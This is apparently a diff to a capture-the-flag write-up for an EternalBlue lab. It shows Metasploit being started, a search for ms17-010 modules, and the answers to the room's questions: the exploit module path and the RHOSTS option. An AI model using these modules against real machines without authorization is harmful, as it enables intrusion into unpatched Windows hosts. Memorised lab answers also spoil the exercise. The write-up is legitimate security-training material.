@@ -131,6 +131,40 @@ Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code 
 
 #### 2.1 - Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
 
+Start Metasploit
+
+```bash
+msfconsole -q
+```
+
+```bash
+msf6 > search ms17-010
+```
+
+```bash
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+```
+
+> exploit/windows/smb/ms17\_010\_eternalblue
+
+#### 2.2 - Show options and set the one required value. What is the name of this value? (All caps for submission)
+
+> RHOSTS
+
+#### 2.3 - Exploit the machine and gain a foothold.
+
+\
+
+
 \
 
 
